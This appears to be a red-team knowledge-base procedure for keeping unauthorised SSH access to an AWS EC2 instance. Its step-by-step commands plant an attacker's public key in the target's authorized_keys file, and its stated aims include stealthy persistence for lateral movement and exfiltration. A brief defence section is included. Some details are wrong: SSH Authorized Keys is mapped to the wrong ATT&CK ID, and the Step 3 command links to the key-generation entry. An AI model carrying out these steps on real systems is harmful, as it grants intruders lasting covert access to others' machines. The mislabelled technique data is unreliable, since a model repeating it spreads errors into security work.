---
id: 5bbd719a-bd1b-4077-8b30-0b0c45422084
name: AWS SSH Key Persistence
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Valid Accounts|T1078 - Valid Accounts]]'
techniques:
  - '[[techniques/Valid Accounts|T1078.004 - SSH Authorized Keys]]'
sub_techniques: []
tags:
  - '[[tags/Cloud - AWS]]'
  - '[[tags/Exploitation]]'
  - '[[tags/Persistence]]'
  - '[[tags/SSH Persistence example]]'
commands:
  - '[[commands/ssh-keygen-generate-key-pair]]'
  - '[[commands/ssh-append-public-key-to-authorized-keys]]'
platforms:
  - AWS
  - Linux
tools:
  - '[[tools/OpenSSH]]'
validated: true
---

# AWS SSH Key Persistence

## Summary

AWS SSH Key Persistence is a technique used by attackers to maintain long-term access to an AWS EC2 instance by generating an SSH key pair locally and appending the public key to the target's ~/.ssh/authorized_keys file. This allows passwordless authentication using the private key, ensuring persistence even if the instance is stopped, started, or replaced, as long as the authorized_keys file persists.

## Description

In an AWS environment, attackers who gain initial shell access to an EC2 instance (e.g., via exploited vulnerabilities or stolen credentials) can establish persistence by modifying SSH configurations. The process involves creating a new RSA key pair on the attacker's machine, securely transferring the public key to the target instance, and appending it to the authorized_keys file for the target user (often ec2-user or ubuntu). This enables future logins without passwords or keys, bypassing MFA if not enforced separately. The technique is stealthy because it leverages legitimate SSH functionality and can survive instance reboots. It maps to MITRE ATT&CK under Persistence (TA0003) via Valid Accounts (T1078.004: SSH Authorized Keys), as it manipulates account authentication mechanisms. Detection is challenging without monitoring file changes or SSH logs, making it valuable for red team operations simulating advanced persistent threats in cloud environments.

## Requirements

1. Initial shell access to the AWS EC2 instance (e.g., via SSH with password, AWS SSM, or exploited service).
2. Local machine with OpenSSH tools installed (ssh-keygen, ssh, scp).
3. Network connectivity between attacker machine and target instance (inbound SSH port 22 open in security group).
4. Sufficient privileges on the target to write to ~/.ssh/authorized_keys (user-level access suffices if targeting that user's home).

## Defense

- Regularly audit and rotate SSH keys; use AWS IAM roles instead of key-based access where possible.
- Enable SSH logging and monitor for unauthorized modifications to authorized_keys using tools like AWS CloudTrail or file integrity monitoring (e.g., OSSEC).
- Enforce key-based authentication only with approved keys via bastion hosts or AWS Systems Manager Session Manager.
- Implement least privilege: Restrict inbound SSH to trusted IPs and use MFA for console access.

## Objectives

1. Establish passwordless, persistent SSH access to the AWS EC2 instance.
2. Ensure access survives instance lifecycle changes like stops/starts.
3. Maintain stealthy persistence in a cloud environment for further lateral movement or data exfiltration.

## Instructions

### Step 1: Generate SSH Key Pair Locally

**Context**: Create a new RSA key pair on your local machine to obtain the public key for injection. This step ensures you have a private key for future authentication. Use a secure location and optionally set a passphrase for the private key.

**Command** ([[commands/ssh-keygen-generate-key-pair]]):
```bash
ssh-keygen -t rsa -b 2048 -f ~/.ssh/aws_persistence_key -N ""
```

This generates a 2048-bit RSA key pair without a passphrase (for automation; add -N "passphrase" for security). The private key is saved as aws_persistence_key and public as aws_persistence_key.pub. Expected output includes confirmation of key generation and fingerprint for verification.

### Step 2: Append Public Key to Target's Authorized Keys

**Context**: Transfer and append the public key to the target's ~/.ssh/authorized_keys file to enable key-based login. This assumes initial access via password or existing key; create the .ssh directory if it doesn't exist and set proper permissions to avoid SSH denial.

**Command** ([[commands/ssh-append-public-key-to-authorized-keys]]):
```bash
ssh user@target-ip 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys' < ~/.ssh/aws_persistence_key.pub && ssh user@target-ip 'chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys'
```

Replace 'user' with the target username (e.g., ec2-user) and 'target-ip' with the instance's private/public IP. This pipes the public key content over SSH, appends it, and sets secure permissions (700 for .ssh, 600 for authorized_keys). If .ssh doesn't exist, mkdir creates it. Expected output: No errors from SSH, confirming successful append and permission changes. Verify by attempting SSH login with the new private key: ssh -i ~/.ssh/aws_persistence_key user@target-ip (should connect without password prompt).

### Step 3: Verify Persistence

**Context**: Test the new key for authentication and confirm persistence by simulating an instance reboot (via AWS console or CLI). This ensures the modification survives and provides reliable access.

**Command** ([[commands/ssh-keygen-generate-key-pair]]):
```bash
ssh -i ~/.ssh/aws_persistence_key user@target-ip 'whoami'
```

After rebooting the instance (e.g., aws ec2 reboot-instances --instance-ids i-1234567890abcdef0), reconnect using the private key. Expected output: Successful login showing the target username, confirming persistence.
